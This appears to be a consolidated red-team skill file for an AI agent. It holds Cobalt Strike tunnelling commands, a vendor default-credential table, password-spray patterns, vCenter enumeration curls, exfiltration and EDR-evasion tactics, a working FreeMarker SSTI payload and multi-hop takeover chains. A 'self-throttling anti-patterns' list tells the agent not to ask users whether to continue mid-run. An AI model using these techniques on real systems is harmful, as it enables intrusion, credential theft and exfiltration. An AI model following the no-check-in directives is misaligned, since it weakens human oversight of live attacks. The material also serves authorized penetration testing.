# VPS — team server binds locally
./TeamServerImage ... -Dcobaltstrike.server_bindto=127.0.0.1 ... teamserver 127.0.0.100 <pw>
# raw TCP smuggled in WebSocket
websocat -E -b ws-l:127.0.0.1:40000 tcp:127.0.0.1:50050 &
cloudflared tunnel --url http://127.0.0.1:40000 --no-autoupdate
# Operator side
websocat -E -b tcp-l:127.0.0.1:2222 ws://mytunnel.domain.com/<long-uuid> &
```
Diagram: Operator ──(raw TCP)──► websocat ──(WS)──► cloudflared ──► Cloudflare edge ──► teamserver 127.0.0.1:50050. Beacon ──(HTTPS Malleable)──► same domain/different path ──► nginx ──► teamserver 127.0.0.1:443. Smart redirector: forward only matching User-Agent/URIs (+ custom `session_id` header); deflect everything else to a benign site.

### Keylogger / implant IOC patterns (defensive framing)
- `SetWindowsHookEx`: low-level hooks leave no injected DLL but pin the installing thread and leave a message-queue footprint; global hooks leave a mapped DLL (VAD artefact, check signature).
- `NtUserRegisterRawInputDevices`: invisible to `WinDbg !hook` and hook-chain sensors, **but raises a non-avoidable ETW event** from `win32kfull.sys` with PID/TID/UsagePage/Usage/Flags — the strongest IOC, channel on by default, cannot be disabled without patching the kernel.
- Session boundary: raw input is per-session; a service in session-0 cannot see session-1 keystrokes. Direct `\Device\KeyboardClass0` access needs admin and creates `IRP_MJ_READ` telemetry.
- Window-title capture: `GetWindowTextA` is heavily detected; `NtUserInternalGetWindowText` (Win32kFull.sys, via win32u.dll) is lower-signature.

### Supply-chain recon commands
```bash
gh repo list "$ORG" --limit 100 --json name | jq -r '.[].name' | grep -iE "internal|infra|deploy|config|secret"
curl -sk https://target.com/main.js | grep -oE '@[a-z-]+/[a-z-]+' | sort -u
curl -sI "https://registry.npmjs.org/$pkg" | head -1   # 404 → dep-confusion candidate
gh api "repos/$ORG/$REPO/releases" --jq '.[] | .assets[] | select(.name | test("sbom|cyclonedx|spdx"; "i"))'
cargo install zizmor; zizmor .                          # workflow injection detection
trufflehog filesystem /tmp/img/extracted --no-update
```
Secret leakage in public Actions logs: search for `token|key|secret|password|credential|aws_`. Compromised CDN check: grep target HTML/JS for `polyfill.io` / `cdn.jsdelivr.net.*polyfill`.

### Engagement journaling (mandatory, all skills)
```jsonl
{"ts":"2026-05-08T14:40:53","email":"user1@<client>.example","pw_first4":"<r4>","status":"VALID_CA_BLOCK","code":"AADSTS53003","attempts_used":1}
```
Per-user atomic tracker + IP rotation log are deliverable evidence. Never run ad-hoc commands without logging — you lose the original PoC timestamp when the recheck fails.

### Default credentials — test ≤2 attempts, lockout risk (`enterprise-vpn-attack`, `vmware-vcenter-attack`)

| Vendor / product | User | Password | Note |
|---|---|---|---|
| Cisco ASA | admin / enable_15 | cisco | Factory default; rarely seen in prod |
| Fortinet | admin | (empty) | Factory default |
| Citrix NetScaler | nsroot | nsroot / (serial) | Newer firmware uses serial |
| Palo Alto | admin | admin | Factory default |
| Pulse Secure | admin | password | CIS hardening changes this |
| F5 Big-IP | root / admin | default / admin | Common alternates |
| SonicWall | admin | password | Factory default |
| vCenter 6.x | `administrator@vsphere.local` | set-during-install | VERY low lockout — one high-confidence guess only |
| vCenter Appliance root | root | `vmware` (legacy) | Lab/staging often unchanged |
| ESXi root | root | blank / `vmware` | |
| Aria Operations | admin | `vmware` (legacy) | |

### Common spray password patterns (multi-brand enterprise, `m365-entra-attack`)
`<Brand>@2026`, `<Brand>@123`, `<Brand>@26`, `<PlantCity>@<Year>`, employee-ID-as-password (PAN/employee code/phone last4), `Password@<year>`, `Welcome@<year>`, `Admin@<year>`. When the client supplies stealer logs, use those FIRST — each leaked cred is one cap-attempt against the strongest known guess for that user.

### vCenter post-auth API enumeration (after one credential)
```bash
curl -sk -X POST -u 'user@vsphere.local:<pw>' "https://$TARGET/api/session"
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/vm"
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"
curl -sk -H "vmware-api-session-id: <token>" \
  "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"   # VMDKs, snapshots, cloud-init creds
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local" | xmllint --format -
ldapsearch -x -H "ldap://$TARGET:389" -b "" -s base                # anonymous vmdir bind
```

### Data exfiltration patterns (`offensive-advanced-redteam`)
- DNS tunneling for small high-value files (passwords, tokens); smuggle data in seemingly normal HTTP traffic.
- Know the target stack: with only Splunk + ClamAV, a Python HTTP server + `cloudflared` tunnel exfiltrated 80 GB after hours in a source engagement. With mature EDR, prefer low-and-slow covert channels.
- Two-beacon model: long-haul DNS covert channel (sleeps a lot, backup/respawn) + short-haul HTTP beacon (hands-on operations). SMB listeners on internal machines relay to beacon A — stealthier.
- Always encrypt, even internal traffic: a source engagement escalated across a whole network by sniffing cleartext credentials in raw HTTP on the local LAN.

### Tooling referenced by the source skills
```bash
pip install --break-system-packages msftrecon o365spray
brew install pandoc                                   # report generation
go install -v github.com/projectdiscovery/...         # recon toolkit
cargo install zizmor                                  # GitHub Actions injection detection
npm i -g trufflehog ; gitleaks ; osv-scanner
# Mobile: brew install jadx  (apk-redteam-pipeline flow)
```
Okta-specific: **OktaTerrify** (github.com/silverhack/OktaTerrify) is the only verifiable public Okta-specific offensive tool — build engagement-specific scripts against `/api/v1/*` rather than citing unverified tool names. VMware: nuclei `vmware-vcenter-*.yaml`, Metasploit `exploit/multi/http/vmware_vcenter_*`, Greenbone NASL plugins.

---

## Common Root Causes

1. **Trust edges around identity providers** — third-party support providers with persistent privileged access, help desks as trust anchors with no out-of-band verification, customer-uploaded HAR files containing live session tokens, federated IdPs issuing arbitrary-NameID assertions. The IdP product code is rarely the bug.
2. **Bearer-token sessions without binding** — Okta session cookies replayed from a residential proxy bypass MFA entirely (already-MFA-completed session); no IP/device binding until DPoP / device-bound session cookies.
3. **Unauthenticated management-plane endpoints** — vCenter plugin upload paths, Workspace ONE FreeMarker templates, VPN path-traversal file reads, anonymous MOB. Missing auth filter + unsanitized input = pre-auth RCE.
4. **Host-header / internal-request trust** — CVE-2022-22972 used the `Host` header unvalidated as the target of an internal auth-validation request (SSRF-into-self with trust elevation).
5. **Mutable references and missing scope mapping** — `curl | bash`, `@v35` action tags, `^1.0.0` semver, `.npmrc` without `@scope:registry=` mapping. Package managers default to "highest version wins, regardless of registry."
6. **OPSEC failures in operator infrastructure** — team server bound to `0.0.0.0`, default Cobalt Strike profile, eternal listeners, dumb redirectors that forward all traffic. These get scanned and taken down.
7. **EDR/telemetry blind spots** — low-level hooks relying on message-queue side effects; raw-input ETW channel that exists but is not monitored; reliance on API calls where a LOLBin would pass.
8. **Lockout-threshold misconfiguration** — functional/service accounts exempted from CA because automation can't satisfy MFA; vCenter SSO with 3-attempt permanent lockout; shared Smart Lockout counters across all auth flows.
9. **Data over-collection** — conflating "keep digging" (coverage) with "extract everything" (theft). Pulling more records never strengthens the finding and creates liability.
10. **Reproducibility mistaken for false positive** — patching mid-engagement, WAF deployment, or network jitter causing a recheck to fail; the original finding is retracted instead of diffed.

### Root cause → source skill map

| Root cause | Grounded in |
|---|---|
| Trust edges around IdPs / bearer sessions | `okta-attack`, `m365-entra-attack` |
| Unauthenticated management planes | `enterprise-vpn-attack`, `vmware-vcenter-attack` |
| Mutable refs / missing scope mapping | `supply-chain-attack-recon` |
| Operator OPSEC failures | `offensive-advanced-redteam` |
| Telemetry present but unmonitored | `offensive-keylogger-arch` |
| Cap/pacing misconfiguration | `m365-entra-attack`, `okta-attack` |
| Data over-collection / false retractions | `redteam-mindset`, `redteam-report-template` |

### Self-throttling anti-patterns to flag immediately (`redteam-mindset`)
1. Asking "want me to continue?" mid-run after the user chose full engagement.
2. Stopping at first-class 401/403 — run all 12+ auth-bypass classes.
3. "Interesting constant token, not chased" — a constant across varying responses is a *lead*.
4. Reading robots.txt but not the Disallow lines.
5. Treating a 37 KB body inside a 404 as "noted" — read and diff it.
6. OpenAPI exposed → only 4 of N endpoints probed.
7. "APK retest deferred — needs tooling" — `brew install jadx` is five minutes.
8. Volume framed as a problem — 3,000 well-tagged requests is normal cadence.
9. Inserting `AskUserQuestion` at any decision point inside an active loop.
10. Skill-gap-as-stop-condition — apply the vendor check matrix manually.

---

## Bypass Techniques

### Conditional Access / MFA (document even when blocked)
| Vector | Status (2026) | Notes |
|---|---|---|
| Different ROPC `client_id` (Graph PS `1b730954-…`, Azure CLI `04b07795-…`, Office `d3590ed6-…`) | Sometimes | CA can be per-app |
| Different resource (graph / outlook / management.azure.com) | Sometimes | CA scope can be per-resource |
| EWS / IMAP / POP3 / SMTP Basic Auth | Mostly disabled | Deprecated Oct 2022; per-account exceptions exist |
| FOCI refresh-token minting | Post-auth | Use one FOCI client's refresh token for another |
| Device-code phishing | Works | Requires user interaction — often OOS |
| Compliant-device emulation | Hard | Needs Intune registration |
| AiTM session-cookie steal | Works (phishing) | Modern primary path — OOS for non-phishing engagements |
| SAML SSO via a different SP | Sometimes | Each enterprise app has its own CA policy |
| Geo-bypass via VPN | Sometimes | If "trusted location" includes corp HQ IPs |

**Critical framing:** in a tenant with universal CA (compliant device + MFA), all paths return AADSTS53003 — the credential is valid but unusable externally. Phishing-completed cookie steal is the only realistic adversary path. Document that clearly. Okta push factors are bypassable in 2024+: phishing fatigue, SMS/voice fallback, security-question KBA, and the **Okta Verify iOS CVE-2024-10327** where both "Yes" and "No" returned accept — treat every Okta push factor as bypassable (push bombing is OOS without explicit OK).

### Federation / SAML
- XSW1–XSW8 / signature-stripping against a federated IdP → forged assertion.
- Inbound-federation IdP injection (Scattered Spider pattern): add attacker-controlled IdP, enable account linking, set arbitrary NameID → impersonate any user.
- Okta-as-IdP for Entra: compromise Okta → SAML assertion to Entra → full M365 access without touching `login.microsoftonline.com`.
- vCenter Workspace ONE SP metadata → forged assertion with `userPrincipalName=administrator@vsphere.local` → virtualization-plane takeover.

### EDR evasion / implant
- `host_stage=false`; `sleep_mask` + `obfuscate`; profile Microsoft Teams / Azure API chatter (URIs, headers, UAs); valid Let's Encrypt cert matching the profile; timestomping; kill dates; jitter; no disk writes; LOLBins; WinRM over `psexec`; SMB listeners for relay; parent-process spoofing to 3 generations.
- Keylogger IOCs: hook-chain detection and VAD scans; raw-input ETW is **not avoidable** — do not discount it. Overwriting a mapped DLL requires blocking keyboard interaction. Session-0 cannot register raw input; hidden desktops are logged by Object Manager auditing.

### Appliance / patch caveats
- Don't conclude "patched" from one 404 — patches deploy unevenly; test 3+ CVEs per vendor; banners get backported.
- Detection-only first (HEAD + version banner + canary), escalate to RCE PoC only with explicit OK.
- Rate-limit and jitter — appliances log every request to SIEM.

### Supply chain
- Register unused internal names defensively; configure `.npmrc` scope mapping; pin actions to commit SHA; avoid `curl | bash`.
- Severity calibration: unclaimed name + no scope mapping + actively in builds = Critical; unclaimed name alone = Informational. Publishing requires signed, scope-clarified authorization.

### The AADSTS50076 substring trap (`m365-entra-attack`)
When CA requires MFA, Entra's error body **contains the literal string `"access_token"` inside the `claims` challenge** (`claims.access_token.capolids`). A loose `if "access_token" in raw_body` false-positives every MFA-blocked attempt as a token issuance. Always parse JSON then check `if "access_token" in parsed_dict`. The `capolids` values are tenant-internal CA policy IDs — defender-side breadcrumbs for engagement notes, **not** an attacker win.

### Mid-engagement IR detection — treating defense shifts as bypass data
When a defense appears mid-test (`redteam-mindset`, `mid-engagement-ir-detection`):
1. Original PoC artifacts are forever — capture before recheck.
2. Diff the response: body size, headers, cookies, timing. The delta tells you what the client deployed (WAF rule / hotfix / geo-block).
3. The deployed mitigation is itself a finding — positive operational observation.
4. Try alternative vectors: slower timing, encoded keywords, different injection contexts, cookie/header injection.
5. Document both states: "vulnerable at T0, mitigated at T0+30min, mitigation likely at WAF (bypassable)."
Never retract on first reproducibility failure.

### Okta anti-patterns (`okta-attack`)
- Don't use Entra-style spray pace on Okta — anti-automation is tuned differently; 429 hits faster.
- Don't skip factor enumeration — the factor list defines the realistic threat model.
- Don't assume MFA-fatigue is in scope — explicit OK required.
- Don't confuse `*.oktapreview.com` with production — different severity.
- Confirm enumeration vector freshness on each engagement: test one known-existing + one known-nonexistent user, byte-compare and time the responses. If identical, the vector is hardened.

---

## Gate 0 Validation

Before writing any report, confirm all three:

1. **What can the attacker DO right now?** Can you retrieve a response proving access (metadata token, web-shell output, valid credential AADSTS code, canary-confirmed RCE)? "The server made a request" or "the name is unclaimed" is insufficient — show *where* it goes and *what comes back*.
2. **What does the victim LOSE?** Full Entra tenant ATO via one functional account? Whole virtualization plane via vCenter? Domain/LDAP bind creds via VPN appliance? Quantify blast radius (which apps, which users, which data), tied to business and regulation. Red-team severity ≠ CVSS alone — a CVSS Medium touching a regulated dataset can be Critical for the client.
3. **Can it be reproduced in 10 minutes from scratch?** Endpoint live, callback/hit reliable, second person can follow steps. Flakiness resolved before submission.

Additional red-team gates:
- **2+ cross-technique confirmations** (e.g., ROPC AADSTS53003 + SAML SSO CA-block page; RCE canary + baseline diff).
- **Cap discipline held**: per-user attempt count from atomic state file; serial paced; kill-switch not tripped; if tripped, pause and diagnose before continuing.
- **Authorization still in scope**: technique (not just target) is covered by SOW; publishing / RCE / MFA-fatigue actions have explicit sign-off.
- **Data minimization respected**: minimum evidence pulled, precisely classified, cleanup path defined. "Authorized ≠ unrestricted."
- **Original artifacts preserved**: screenshots, request/response pairs, timing samples captured *before* any recheck.
- **Sister apps swept**: any shared-backend finding checked across all siblings; class-fix recommended.

### Scope / authorization boundary matrix (from the source skills' "DO NOT use" rules)

| Domain | In scope (external recon / authorized) | Requires explicit written OK / out of scope |
|---|---|---|
| Enterprise VPN | HEAD + banner + version fingerprint, SAML metadata, AAA error decode | Pre-auth RCE PoCs (bricking risk); internal lateral movement after foothold; client-side VPN bugs; IPsec/L2TP/OpenVPN |
| VMware | Internet-exposed vCenter/ESXi/Workspace ONE fingerprint, MOB reachability, canary-gated detection | File-upload webshell execution; internal-only vCenter reachable only via VPN; ESXi OpenSLP port 427 (different surface) |
| M365 / Entra | msftrecon, OneDrive enum, capped serial ROPC, AADSTS decode, SAML SSO validation | On-prem-only AD; service-to-service token attacks; phishing-required chains (prep only) |
| Okta | Tenant discovery, factor enumeration, `redirect_uri` tampering, post-compromise `/api/v1/*` review | Push-notification fatigue / MFA bombing; EvilProxy/Evilginx deployment; `*.oktapreview.com` treated as production |
| Supply chain | Public GitHub/registry/SBOM recon, candidate lists, workflow static scan | Publishing typosquat/dep-confusion packages; submitting PRs to client repos; scraping whole registries; internal artifact registries; self-hosted CI runners |
| C2 / implants | Local-bind team server, redirector design, profile hardening, tiered infrastructure | Any operation outside SOW; forgetting kill dates; 0.0.0.0 binds |
| Redteam mindset | All in-scope active probing; journaling; class-fix recommendations | Bug-bounty / WAPT / compliance scope rules; extracting more data than needed |

### Cross-technique confirmation matrix (`redteam-mindset`)

| Vuln class | Primary signal | Cross-check |
|---|---|---|
| Time-based blind SQLi | SLEEP() differential | 3 distinct SLEEP variants |
| Boolean blind SQLi | Body-size differential | Different boolean comparisons |
| Error-based SQLi | Error reflection | UPDATEXML + EXTRACTVALUE |
| RCE | Command output reflection | OOB callback (interactsh DNS) |
| LFI | File content reflection | Different paths / encodings |
| SSRF | Internal-only response | OOB callback |
| Valid credential (M365) | ROPC AADSTS53003 | SAML SSO + `ConvergedConditionalAccess` page |
| Auth bypass | Logged-in landing page | Session cookie persistence on next request |
| vCenter RCE | Canary echoed in-band | `uid=` diff against Stage-A baseline |
| Supply-chain | Unclaimed internal name | Build-system evidence it would be resolved |

"A single signal can be coincidence (network jitter, server hiccup, cache). Two distinct signals from the same root cause is definitive."

### Pre / during / post checklists (condensed from `redteam-mindset`)

**Pre-engagement:** scope clear (subdomains/SaaS/phishing/implant in or out); SOW + EL/RoE referenced; test IPs logged; `engagement_log/` initialized; hard cap decided; kill-switch thresholds set; crown jewel identified; critical-finding-discuss protocol agreed; Burp default for evidence; journal initialized.

**During (every 30 min):** progress or stuck? Last result journaled? Current IP logged? Sister apps tested if a vuln confirmed? Next vector tried if blocked? If tempted to stop — scope exhausted or just tired?

**Post:** every finding 2+ confirmations; PoC reproducible in <5 min by another tester; original artifacts preserved; mid-engagement IR observations documented; active-attacker observations documented; sister-app sweep complete; state files preserved; tooling gaps logged.

---

## Real Impact Examples

### A. Functional-account MFA bypass via Entra license differential (`hunt-skills/m365-entra-attack/SKILL.md`)
OneDrive `GET /personal/accounts_<domain>_com/...` returned 404 (no license) while ROPC returned AADSTS50126 for `accounts@<client>.example` → classified as a shared/functional account with a password, historically MFA-exempt because automation can't satisfy MFA. The credential was confirmed valid; even with CA blocking token issuance (AADSTS53003), the finding is a real ATO path against legacy protocols. Simultaneously, 261 accounts appeared pre-existing LOCKED under a 1-attempt cap (math: 1 < 10) — documented as an active external password-spray campaign, SOC-actionable.

### B. Okta cross-tenant impersonation / session replay (`hunt-skills/okta-attack/SKILL.md`)
Scattered Spider / Octo Tempest (CISA AA23-320A) called the IT help desk impersonating an employee, got MFA + password reset, escalated to Okta Super-Admin, configured a second attacker-controlled IdP with inbound federation and account linking, and impersonated any user across the tenant — used in MGM/Caesars ($100M+ losses). Parallel class: the 2023 support HAR-file leak exposed live session cookies → replay against 134 customers (BeyondTrust, Cloudflare, 1Password). The recon takeaway: map third-party support, help-desk, and federated-IdP trust edges before product bugs.

### C. VPN CVE → web-shell → vCenter pivot (`hunt-skills/enterprise-vpn-attack/SKILL.md`, `hunt-skills/vmware-vcenter-attack/SKILL.md`)
A Pulse/Ivanti or Fortinet pre-auth path-traversal file read yields the `sslvpn_websession` file with active sessions; a path-traversal-to-RCE CVE gives a web-shell as `root` on the appliance; LDAP bind credentials and RADIUS shared secrets are extracted from VPN config and reused against internal vCenter (if scope permits) → datacenter takeover. CVE-2021-21972 (`/ui/vropspluginui/rest/services/uploadova`) and CVE-2022-22954 (FreeMarker SSTI at `/catalog-portal/ui/oauth/verify?deviceUdid=`) are canonical vCenter RCE primitives.

### D. Dependency confusion RCE on CI runner (`hunt-skills/supply-chain-attack-recon/SKILL.md`)
An internal npm scope `@target-internal/utils` leaked in a public JS bundle; registry returned 404 and `.npmrc` had no scope mapping; the package appeared in an active `package.json`. Publishing a higher-version package with a `preinstall` hook would execute attacker code on the next CI `npm install`, exfiltrating `$AWS_ACCESS_KEY_ID` / `$GITHUB_TOKEN`. Deliverable is a candidate inventory + reproduction steps — **publication itself stays out of scope without written sign-off** (Alex Birsan 2021, $130K+ bounties).

### E. C2 team server taken down by Shodan (`hunt-skills/infrastructure/offensive-advanced-redteam/SKILL.md`)
A Cobalt Strike team server bound to `0.0.0.0` with the default profile listened eternally, was indexed by Shodan, and was taken down mid-engagement. Correct posture: bind to `127.0.0.1`, expose only through a smart redirector with User-Agent/URI filtering and deflection, tier the infrastructure, set kill dates.

### F. Mid-engagement SOC patch as a second finding (`hunt-skills/redteam-mindset/SKILL.md`, `hunt-skills/redteam-report-template/SKILL.md`)
A confirmed SQLi stopped reproducing 30 minutes after discovery. Instead of retracting, the operator diffed the response, identified a WAF rule deployment, preserved the original PoC screenshot, and shipped "Confirmed; patched mid-engagement" plus a positive operational finding on SOC responsiveness. "The deployed mitigation is itself a finding."

### G. Citrix Bleed session-token theft (`hunt-skills/enterprise-vpn-attack/SKILL.md`)
A long `Host` header (24,812 bytes) POST to `/oauth/idp/.well-known/openid-configuration` caused a memory disclosure that leaked authenticated session tokens. Because the token is a bearer credential, replaying it grants a VPN session without password or MFA — the same class as Okta HAR-file replay. Detection is non-destructive (measure response body size delta against a normal request), so it is safe to fingerprint before any escalation decision.

### H. Workspace ONE SSTI / ESXi AD-group takeover (`hunt-skills/vmware-vcenter-attack/SKILL.md`)
CVE-2022-22954 turned a single unauth GET to `/catalog-portal/ui/oauth/verify?deviceUdid=${"freemarker.template.utility.Execute"?new()("id")}` into OS command execution as the `horizon` service account; CVE-2024-37085 let an attacker with AD rights create a group literally named `ESX Admins` and be auto-granted full admin on every domain-joined ESXi host, enabling mass VM encryption (Storm-0506 / Black Basta). Both were CISA KEV entries — a current-minus-one patch level is a same-day Critical callout.

### I. Maintainer-account supply-chain compromise (`hunt-skills/supply-chain-attack-recon/SKILL.md`)
Of 12 disclosed cases, 6 were maintainer-account compromises rather than technical CVEs: ua-parser-js (phished maintainer → cryptominer + credential stealer), event-stream (maintenance handover social engineering → Copay wallet seed theft), Codecov (credential mistake → bash uploader exfiltrated CI env vars for two months), SolarWinds (build-pipeline compromise → signed SUNBURST DLL to ~18,000 customers), 3CX (cascading from X_TRADER), and XZ Utils (two-year social engineering, caught by a 500 ms SSH delay). Recon takeaway: check maintainer 2FA status, recent maintainer changes, and `curl | bash` patterns in workflows.

### J. Raw-input keylogger detected by ETW (`hunt-skills/infrastructure/offensive-keylogger-arch/SKILL.md`)
A "stealthy" `NtUserRegisterRawInputDevices` + `RIDEV_INPUTSINK` input-capture implant avoided hook-chain tools (`WinDbg !hook`) and left no cross-process DLL mapping — but the kernel emitted `EtwTraceAuditApiRegisterRawInputDevices` with PID/TID/UsagePage/Usage/Flags. Because the channel is on by default and cannot be disabled without patching the kernel, a non-interactive process requesting keyboard raw input is trivially scorable as suspicious. The source calls this "the strongest IOC for this technique; do not discount it." Defensive value: this is how the architecture is caught, and why an operator must know the target stack before choosing an implant.

---

## Source Skill Lineage

All 10 curated source files, grouped by family. Each contributes a unique capability; the full text is archived at `references/source-knowledge.md`.

### Operational doctrine
- `hunt-skills/redteam-mindset/SKILL.md` — **Unique contribution:** the "gain access, prove impact" scope model, DO-NOT-STOP persistence directive, data-minimization boundary, 9 mindset corrections, blocker decision trees, and pre/during/post-engagement checklists.
- `hunt-skills/redteam-report-template/SKILL.md` — **Unique contribution:** client-deliverable 6-section finding format, red-team-specific Status field (`Confirmed; patched mid-engagement`), business-translated Impact framing, DOCX/pandoc conversion, IoC + cleanup statement, and quality checks.

### Identity attack paths
- `hunt-skills/m365-entra-attack/SKILL.md` — **Unique contribution:** msftrecon tenant mapping, AADSTS code semantics, Smart Lockout math and 1–2 attempt cap discipline, OneDrive personal-site enumeration + license differential, ROPC validator with JSON-parsing trap, serial-pacing hard rule, SAML SSO Playwright validation, and active-attacker lockout detection.
- `hunt-skills/okta-attack/SKILL.md` — **Unique contribution:** tenant slug/region discovery, factor-list enumeration and phishing-resistance grading, `redirect_uri` tampering, lockout/status codes, and the 8-case disclosed-case catalogue (LAPSUS$/Sitel, HAR leak, Scattered Spider, cross-origin stuffing, CVE-2024-0981, CVE-2024-10327, CrossTalk/Secret Agent, stealer-cookie replay) with the "trust edges around Okta" thesis.

### Perimeter / infrastructure
- `hunt-skills/enterprise-vpn-attack/SKILL.md` — **Unique contribution:** vendor-by-vendor SSL VPN fingerprinting, CVE matrix (Cisco/Fortinet/Citrix/Palo Alto/Pulse/Ivanti/SonicWall), SAML SP misconfig checks, AAA backend identification, tunnel-group enumeration, rate-limited nuclei triage, and critical-infrastructure operational discipline.
- `hunt-skills/vmware-vcenter-attack/SKILL.md` — **Unique contribution:** vCenter/ESXi/Workspace ONE build fingerprinting, external-exploitable CVE matrix, canary + baseline-gated RCE confirmation, MOB/API datastore enumeration, aggressive-vCenter-lockout warning, and 10 disclosed CVE citations.

### Offensive R&D / evasion
- `hunt-skills/infrastructure/offensive-advanced-redteam/SKILL.md` — **Unique contribution:** teamserver-behind-redirector design (websocat/cloudflared), Malleable profile hardening, 3-tier infrastructure segregation, staged loader architecture, LOLBin/living-off-the-land and OPSEC rules, smart vs dumb redirectors, and DNS/HTTP exfiltration.
- `hunt-skills/infrastructure/offensive-keylogger-arch/SKILL.md` — **Unique contribution:** Windows hook internals (`SetWindowsHookEx`, `NtUserSetWindowsHookEx`, `zzzzNtUserSetWindowsHookEx`), low-level vs global hook injection semantics, raw-input abuse via `NtUserRegisterRawInputDevices` with `RIDEV_INPUTSINK`, and the non-avoidable ETW IOC / session-boundary constraints for input-capture architecture.

### Supply chain
- `hunt-skills/supply-chain-attack-recon/SKILL.md` — **Unique contribution:** external-only supply-chain recon map (GitHub org, internal package names, Docker registries, SBOMs, registry URL leakage), dependency-confusion and typosquat candidate checks, GitHub Actions injection scanning with `zizmor`, 12 disclosed-case catalogue (SolarWinds through XZ Utils), and explicit no-publish / no-self-hosted-runner boundaries.

### Cross-domain anchor (included in the curated set)
- `hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-5-cross-program-invocation-cpi/fv-anc-5-cl10-cross-program-reentrancy-via-callback.md` — **Unique contribution:** the cross-program-invocation reentrancy model — a callback into a caller observing intermediate/inconsistent state before finalization. Not infrastructure, but it reinforces the red-team mental model of observing intermediate state across trust hops (callback hooks, SSO flows, federated assertions) and the "missing guard, not volume" proof discipline; included because it is one of the 10 curated sources.

**Gap note (no fabrication):** the curated 10 contain no dedicated iOS redteam-pipeline source. The only iOS-specific material is the Okta Verify push-response bypass above; mobile work otherwise appears as the adjacent `apk-redteam-pipeline` / APK-decompile cadence. Do not invent iOS procedures from this skill — treat it as a chain to a dedicated mobile skill.

---

## Related Skills & Chains

### Chain cookbook (multi-hop primitives from the source skills)

**1. Perimeter → virtualization plane (scope-gated)**
`enterprise-vpn-attack` appliance CVE → web-shell as `root` → extract LDAP bind / RADIUS shared secret from VPN config → if scope permits, `vmware-vcenter-attack` on internal vCenter → datacenter takeover. Detect SOC response with `mid-engagement-ir-detection` baseline BEFORE exploitation; a mid-test vCenter patch becomes a second finding, packaged via `redteam-report-template`.

**2. Identity federation bypass**
VPN/vCenter SSO metadata → `hunt-saml` XSW1–XSW8 or comment injection against the IdP → forged assertion → session without password/MFA. Okta variant: compromise Okta developer/admin cred → mint legitimately signed assertions for arbitrary impersonation across Salesforce / Workday / AWS / GitHub / M365 (no XSW needed). M365 variant: `getuserrealm` → `NameSpaceType: Federated` with Okta AuthURL → `okta-attack` tenant enum → Okta ATO → SAML assertion → Entra.

**3. Credential → validation → active-attacker detection**
`hunt-ntlm-info` anonymous NTLM Type-2 → AV_PAIR decode → internal AD forest name → `m365-entra-attack` resolves tenant via openid-configuration → ROPC spray with realistic UPN. If `AADSTS50053` appears under a 1-attempt cap, treat as a live external spray → `mid-engagement-ir-detection` → document the locked-user list as a SOC-actionable finding. Cross-check valid cred via SAML SSO `ConvergedConditionalAccess` page.

**4. Supply-chain RCE → cloud plane**
Internal package name leaked in public JS bundle / SBOM / Docker image → publish malicious package under same name with higher version (REQUIRES explicit written sign-off) → next CI `npm install` / `pip install` executes `preinstall` hook → `hunt-rce` post-foothold (env-var extraction yields AWS keys, GitHub PATs, Slack tokens) → `cloud-iam-deep` IAM privilege escalation → production cloud access. Recon-only alternative: candidate inventory + reproduction steps through `triage-validation` 7-Question Gate → `redteam-report-template`, never a published-package PoC without sign-off.

**5. SSRF → identity token**
SSRF to cloud metadata (`169.254.169.254`) → IAM credential theft → `cloud-iam-deep` privilege escalation. Identity variant: host-header SSRF-into-self (CVE-2022-22972 pattern) → admin session without credentials.

**6. Post-foothold pivots**
`hunt-mfa-bypass` (factor downgrade / push fatigue) → authenticated session; `hunt-oauth` (`redirect_uri` tampering, state attack, PKCE bypass) → auth-code theft; `hunt-subdomain` orphan Okta tenants → claim abandoned tenant → SSO takeover; `hunt-cloud-misconfig` accidentally-public registries → pull image → extract baked secrets.

### Flat skill index

- **`hunt-rce`** — Every major VPN appliance and vCenter CVE is pre-auth path-traversal-to-RCE. Chain: VPN/vCenter CVE → web-shell as `root` → config credential extraction → `hunt-rce` post-exploitation.
- **`hunt-saml`** — VPN SAML SP misconfig, Okta per-app SAML, and vCenter Workspace ONE metadata all persist on patched appliances. Chain: SP metadata → IdP fingerprint → XSW/signature-stripping → forged assertion → session without password/MFA.
- **`m365-entra-attack`** — Primary identity chain; AAA backend identification on VPN and NTLM topology leaks feed the spray.
- **`okta-attack`** — Okta-as-IdP federated into Entra; compromise Okta → SAML assertion → full M365 without touching `login.microsoftonline.com`.
- **`vmware-vcenter-attack`** — Natural post-VPN pivot (internal — defer to operator if scope forbids).
- **`enterprise-vpn-attack`** — Perimeter foothold; vCenter is the next pivot.
- **`hunt-ntlm-info`** — VPN admin portal anonymous NTLM Type-2 → AV_PAIR decode → AD forest name → Entra spray on synced tenant.
- **`hunt-mfa-bypass`** — AADSTS lockout/bad-password/MFA-required is a free factor-presence oracle; Okta factor downgrade; push fatigue.
- **`hunt-oauth`** — Okta OIDC `redirect_uri` tampering, state attacks, PKCE bypass.
- **`hunt-subdomain`** — Orphan Okta tenants (`<org>-dev`, `<org>-uat`, `<org>-test`) → claim abandoned tenant → SSO takeover.
- **`cloud-iam-deep`** — SSRF/CI-runner credential exfil → IAM privilege escalation → cloud-plane access.
- **`hunt-cloud-misconfig`** — Accidentally-public container registries and pipeline misconfigs.
- **`offensive-osint`** — GitHub-org recon, SBOMs, JS bundles, Docker tags overlap with supply-chain recon.
- **`recon-scope-triage`** — Clear namespace-collision noise before "probe every live surface" to avoid attacking third parties.
- **`hunt-spa-api`** — JS bundle → backend API map → unauthenticated broken-access-control testing (found a real apex Critical on engagement).
- **`hunt-dispatch`** — Confirms redteam vs WAPT / blackbox vs greybox mode before routing.
- **`mid-engagement-ir-detection`** — Baseline response patterns before exploitation; SOC patches / new IPS rules / external-attacker lockouts are first-class findings.
- **`triage-validation`** — 7-Question Gate on whether a captured artifact (token, code, factor, canary) grants meaningful access; "can I demonstrate impact WITHOUT publishing?" for supply-chain.
- **`redteam-report-template`** — Package validated findings with blast-radius framing; red-team severity calibration.
- **`evidence-hygiene`** — Timestamped screenshot capture feeding PoC evidence blocks.
- **`apk-redteam-pipeline`** — Mobile/APK decompile for secrets and endpoints (adjacent; iOS not covered here).
